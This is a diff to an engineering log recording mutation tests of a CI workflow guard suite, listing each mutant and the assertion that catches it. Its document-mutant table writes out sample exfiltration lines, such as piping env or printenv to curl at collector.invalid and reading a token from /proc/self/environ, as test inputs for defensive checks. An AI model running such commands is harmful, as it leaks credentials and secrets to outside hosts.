@@ -333,3 +333,93 @@ Lints and ratchets (final tree):
   against a baseline of 12), not a row of this suite.
 - `lint-guard-contract.py` on the plan rc 0.
 - `gha-expr.py` byte-identical to `origin/main`.
+
+## Verification-pass fixes (2026-11-10, PR #12563 at ac827785dc, ledger V1-V6)
+
+Sandbox `/var/tmp/soleur-sbx.final10432v.MzVfoed6` (allocator; `knowledge-base/engineering` copied in from `git ls-files`,
+`diff -rq` clean; removed afterwards). Every run is a full suite run as PID 1 of its own namespace (`soleur-sandbox.sh
+run-isolated`) in a mini-root of its own (symlinks to the sandbox, real copies of the suite, `knowledge-base` and the one
+changed file). Workflow mutants run with `SOLE_COPY_DRIFT_WF=<copy>`; document mutants replace the copy at the real path;
+suite mutants replace the suite. The generator (`scratchpad/fv/gen.py`) exits unless each edit lands exactly once inside
+its scope (one step, the job comment block, the ADR addendum, one runbook line); each copy was also checked with `diff`
+(1 or 2 changed lines; 4 for the two-echo mutant) and re-parsed with `yaml.safe_load`.
+
+Controls: the fixed suite, 284/284 rc 0 (twice: before and after the `_iv_forgedprobe` row below). The pre-fix suite and
+runbook of ac827785dc with the same workflow, 278/278 rc 0.
+
+### Workflow mutants (each red on a named assertion; each one SURVIVED the pre-fix suite, 278/278 rc 0)
+
+| Ledger | Mutant (one changed line) | Fixed suite | Named red |
+|---|---|---|---|
+| V1 | probe `TF_PATH: ${{ github.repository == 'jikig-ai/soleur' && 'none.tf' \|\| matrix.tf_file }}` | 281/284 | S1 `step-env-value:probe:TF_PATH` |
+| V1 | probe `TF_PATH: ${{ !matrix.entry == true && matrix.tf_file \|\| 'none.tf' }}` | 281/284 | S1 `step-env-value:probe:TF_PATH` |
+| V1 | probe `TF_RESOURCE: ${{ github.run_id == '77' && matrix.tf_resource \|\| 'none' }}` | 281/284 | S1 `step-env-value:probe:TF_RESOURCE` |
+| V1 | tf_commit `TF_PATH: ${{ github.repository == 'jikig-ai/soleur' && 'apps' \|\| matrix.tf_file }}` | 281/284 | S1 `step-env-value:tf_commit:TF_PATH` |
+| V1 | workflow env `TERRAFORM_VERSION: "1.10.6"` | 281/284 | S1 `wf-env-value:TERRAFORM_VERSION` |
+| V2 | checkout `actions/checkout@0000000000000000000000000000000000000001` | rc 2 after S1 | S1 `checkout-uses`, then the harness FATAL `unmodelled action` |
+| V4 | probe echo `verdict=${v/unprotected-as-declared/matches-declared}` | 281/284 | V4, T2, WV4: "the probe's verdict line says verdict=matches-declared, the published verdict is 'unprotected-as-declared'" |
+| V4 | the same in the probe echo and the gate's clean echo | 281/284 | V4, T2, WV4: the probe line and the gate line each named |
+| V4 | gate clean arm `verdict=matches-declared` for all four clean verdicts | 274/284 | V3, V3b, V4, V5 ... (10 rows): "the gate's verdict line says verdict=matches-declared, the published verdict is 'lift-pending-apply'" (and `lift-not-applied`, `unprotected-as-declared`) |
+| V5 | job comment `5 after it` -> `0 after it` | 282/284 | N4 `job: lacks "2 before the issue's date and 5 after it"` |
+| V5 | job comment `(re-evaluate on 2026-12-01, a Date-shape probe)` inserted | 282/284 | N4 `job: re-evaluate on` |
+
+The other red line in each workflow row is the in-process S2 table running on the mutated job (its control and the row
+for the same edit report "mutation did not land"). For the V5 rows it is H17's copies, built from the mutated file, whose
+anchor text is gone (`did-not-land`). Neither is the property assertion.
+
+### Document mutants (on the real path of a copy)
+
+| Ledger | Mutant | Fixed suite | Named red |
+|---|---|---|---|
+| V3 | verify line 4: `env \| curl --data-binary @- https://collector.invalid/;` before the construct | 282/284 | N3 `[rb_cmdline_ok ... 106443278]` |
+| V3 | verify line 4: `; printenv \| curl -d @- https://collector.invalid/` after jq | 282/284 | N3 `rb_cmdline_ok` |
+| V3 | verify line 4: `curl -sS --oauth2-bearer "$(printenv HCLOUD_TOKEN_R""EADONLY)" ...;` before the construct | 282/284 | N3 `rb_cmdline_ok` |
+| V3 | verify line 4: the token read from `/proc/self/environ` into a second curl's header | 282/284 | N3 `rb_cmdline_ok` |
+| V3 | verify line 4: a `.curlrc` with `connect-to` written and `CURL_HOME` exported before the construct | 282/284 | N3 `rb_cmdline_ok` |
+| V3 | read-back line: `curl --noproxy "*"` (no `--disable`) | 282/284 | N3 `rb_cmdline_ok` |
+| V3 | verify line 4: `curl --disable` (no `--noproxy`) | 282/284 | N3 `rb_cmdline_ok` |
+| V3 | verify line 4: test-design's double-quoted `sh -c "..." && printf ... \| curl ...` line | 282/284 | N3 `rb_cmdline_ok` |
+| V3 | an extra `env \| curl ...` line inside the verify block | 283/284 | N3 `rb_cmdline_ok` |
+| V5 | ADR addendum: "In practice Guard B4 in `apps/web-platform/infra/workspaces-luks.test.sh` is the web-1 forcing function." | 283/284 | N4 `adr: a sentence pairs B4 with "forcing function"` |
+| V5 | ADR addendum `after it 5 (ACTION REQUIRED)` -> `after it 0 (PASS)` | 282/284 | N4 `adr: lacks "after it 5 (ACTION REQUIRED)"` |
+| V5 | ADR addendum `job succeeded and emitted` -> `job ran, or emitted` | 282/284 | N4 `adr: lacks "succeeded and emitted"` |
+
+The second red in the runbook and ADR rows is H15's or H17's own copies (`did-not-land`), as above.
+
+### Suite mutants (a guard clause reverted or deleted)
+
+| Ledger | Guard | Mutant | Result | Named red |
+|---|---|---|---|---|
+| V1 | step env value pin | the `senv[k] != STEP_ENV[key][k]` test made `False` | 280/284 | S2 `v1 the probe's declaration path keyed on the real repository name`, `... behind a ! ...`, `v1 the probe's resource keyed on the fixture run id`, `v1 the commit-time read's path ...` ("not flagged") |
+| V1 | workflow env value pin | the `wenv[k] != WF_ENV[k]` test made `False` | 283/284 | S2 `v1 a workflow env value changed` |
+| V2 | exact checkout SHA | back to `re.fullmatch(r"actions/checkout@[0-9a-f]{40}", ...)` | 283/284 | S2 `v2 the checkout on another 40-hex SHA` |
+| V3 | exact-text pin | rb_cmdline_ok back to round 2's closed grammar (its stdin construct widened to the confined curl, so the real lines pass) | 283/284 | H15 `vb-env-piped-out-before vb-printenv-piped-out-after-jq vb-spliced-name-second-curl vb-proc-environ vb-curlrc-redirect vb-extra-line-in-the-block` |
+| V4 | probe-line verdict equality | the comparison made `true` | 283/284 (after the fix below) | H5 `_iv_forgedprobe` |
+| V4 | gate-line verdict equality | the comparison made `true` | 283/284 | H5 `_iv_forgedgate` |
+| V5 | N4 | back to round 2's n4 (`[^.]*` pairing, no exit or leg requirement, `Re-evaluate by` only) | 283/284 | H17 `adr-b4-pairing-across-a-dotted-path adr-exit-0-past-the-date job-exit-0-past-the-date adr-leg-ran-not-succeeded job-re-evaluate-on` |
+| V6 | `not jt > sum(bounds)` | deleted | 284/284 rc 0 | none: the declared EQUIVALENT mutant (suite header) |
+
+**A gap my first battery found.** The probe-line equality deletion first SURVIVED (284/284 rc 0): `_iv_forgedverdict`
+forges both lines, so the gate equality alone also flags it, and no H5 control isolated the probe line. The row
+`_iv_forgedprobe` (the probe line forged, the gate line true) was added; the deletion then reds H5 `_iv_forgedprobe`
+(283/284), and the control stays 284/284. The workflow mutant `w-v4-probe-echo` was red both before and after (V4, T2,
+WV4 name the probe line).
+
+**V3, the edited lines run.** All five 6604 lines were run against a stub `doppler` (it injects only
+`HCLOUD_TOKEN_READONLY`, from the stub's environment) and a stub `curl` (it records argv and stdin). With no token, each
+prints `missing-token` with rc 3 and makes no request. With a token, each makes one request whose argv starts
+`--disable --noproxy * -sS --config - --max-time 30`, whose stdin is `header = "Authorization: Bearer <token>"`, and whose
+argv never holds the token. The outputs are `404`, `[106443278]`, `[]`, `true` and `protected`, each rc 0. The real
+curl 8.23.0 was also checked: a `.curlrc` under `CURL_HOME` with a `write-out` line is applied without `--disable` and
+ignored with it, and `http_proxy` is not used with `--noproxy "*"`.
+
+**Correction (append-only; the rows above it stay).** Two EQUIVALENT claims in the "Review round 2" section are false, as
+the test-design seat showed on ac827785dc. (1) "exact-wrapper prefix: EQUIVALENT to the tail check". It is false on a
+line that opens with a double-quoted `sh -c "..."` and runs printf and curl outside Doppler. That line passed every other
+clause. (2) The suite-header claim that N1c's read-back equality is EQUIVALENT to its file-wide id set `_f`. It is false
+on a read-back written in the 404 form, which `_f` leaves out. Both claims are removed from the suite header. The first
+no longer applies, since rb_line_ok is gone (V3). The N1c equality stays as a load-bearing clause. The "no other channel
+... can read it" comment is replaced by what the exact-text pin guarantees and what it does not.
+
+Final counts: FLOOR 284 (was 278: six S2 rows, five V1 and one V2; H5, H15 and H17 stay single assertions), TABLE_ROWS 149
+(unchanged).
